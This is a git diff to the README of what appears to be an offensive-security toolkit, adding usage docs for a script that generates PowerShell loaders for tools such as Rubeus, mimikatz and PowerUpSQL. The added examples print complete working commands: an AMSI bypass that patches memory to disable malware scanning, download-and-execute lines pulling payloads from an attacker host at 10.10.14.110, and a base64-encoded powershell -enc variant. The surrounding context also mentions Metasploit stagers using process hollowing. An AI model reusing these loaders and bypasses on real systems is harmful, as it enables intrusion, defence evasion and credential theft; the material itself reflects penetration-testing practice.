@@ -24,7 +24,7 @@ optional arguments:
   --stageless, --no-stageless
 ```
 
-## Examples
+### Examples
 
 ```sh
 # Create a dll that will use hollowing to load shellcode
@@ -32,6 +32,37 @@ python3 generate_win_msf_stager.py --injection hollow --format dll
 
 # Create a stageless exe that will load and run shellcode within the same process
 python3 generate_win_msf_stager.py --stageless --format exe
+```
+
+## Generate Tool Loading Commands
+
+```
+usage: generate_tool_loader.py [-h] [--no-amsi] [--base64]
+                               {adhunttool,evilsqlclient,winpeas,efspotato,metdll,metexe,pslessexec,rubeus,scshell,seatbelt,sharpsploit,spoolsample,sharppersist,sqlclient,sharpup,sharprdp,sharphound,adpeas,getuserspns,hostrecon,lapstoolkit,rubeus-ps,powermad,powersharppack,powerupsql,powerview,runtxt,scshell-ps,seatbelt-ps,sharphound-ps,sharpsploit-ps,sharpersist-ps,sharpkatz-ps,sharpview-ps,winpeas-ps,winpwn,sysinternals,mimikatz,chisel}
+
+positional arguments:
+  {adhunttool,evilsqlclient,winpeas,efspotato,metdll,metexe,pslessexec,rubeus,scshell,seatbelt,sharpsploit,spoolsample,sharppersist,sqlclient,sharpup,sharprdp,sharphound,adpeas,getuserspns,hostrecon,lapstoolkit,rubeus-ps,powermad,powersharppack,powerupsql,powerview,runtxt,scshell-ps,seatbelt-ps,sharphound-ps,sharpsploit-ps,sharpersist-ps,sharpkatz-ps,sharpview-ps,winpeas-ps,winpwn,sysinternals,mimikatz,chisel}
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --no-amsi
+  --base64, -b
+```
+
+### Examples
+```
+# Generate command loader
+$ python3 generate_tool_loader.py rubeus
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);$b=(New-object system.net.webclient).DownloadData('http://10.10.14.110/tools/Rubeus.exe');$a=[System.Reflection.Assembly]::Load($b);[Rubeus.Program]::Main("triage".Split())
+
+# Generate command loader without AMSI bypass
+$ python3 generate_tool_loader.py --no-amsi powerupsql
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.110/tools/PowerUpSQL.ps1');Invoke-SQLAudit
+
+# Base64 encode command for powershell
+$ python3 generate_tool_loader.py --base64 powerupsql
+Command encoded: $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);IEX(New-Object Net.WebClient).downloadString('http://10.10.14.110/tools/PowerUpSQL.ps1');Invoke-SQLAudit
+powershell.exe -enc JABhAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQBzACgAKQA7AEYAbwByAGUAYQBjAGgAKAAkAGIAIABpAG4AIAAkAGEAKQAgAHsAaQBmACAAKAAkAGIALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAGkAVQB0AGkAbABzACIAKQAgAHsAJABjAD0AJABiAH0AfQA7ACQAZAA9ACQAYwAuAEcAZQB0AEYAaQBlAGwAZABzACgAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEYAbwByAGUAYQBjAGgAKAAkAGUAIABpAG4AIAAkAGQAKQAgAHsAaQBmACAAKAAkAGUALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAEMAbwBuAHQAZQB4AHQAIgApACAAewAkAGYAPQAkAGUAfQB9ADsAJABnAD0AJABmAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkAOwBbAEkAbgB0AFAAdAByAF0AJABwAHQAcgA9ACQAZwA7AFsASQBuAHQAMwAyAFsAXQBdACQAYgB1AGYAIAA9ACAAQAAoADAAKQA7AFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAGIAdQBmACwAIAAwACwAIAAkAHAAdAByACwAIAAxACkAOwBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAxADAALwB0AG8AbwBsAHMALwBQAG8AdwBlAHIAVQBwAFMAUQBMAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQA
 ```
 
 ## EFSPotato Local Priv Escalation
